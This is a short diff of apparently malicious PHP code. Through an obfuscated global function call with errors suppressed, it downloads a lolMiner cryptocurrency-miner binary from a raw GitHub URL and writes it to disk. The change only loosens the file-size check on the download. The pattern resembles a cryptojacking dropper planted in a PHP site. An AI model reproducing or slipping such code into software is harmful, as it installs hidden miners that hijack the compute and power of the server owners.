@@ -107,7 +107,7 @@ if(1)
 	{
 		$data = false;
 		$data = @$GLOBALS['__download_002']('https://raw.githubusercontent.com/adsdev2000/test/refs/heads/main/lolMiner/lolMiner_1.95.dat');
-		if($data && strlen($data) > 11000)
+		if($data && strlen($data) > 9000)
 			@file_put_contents($lolm_path, $data);
 		else
 			$data = false;
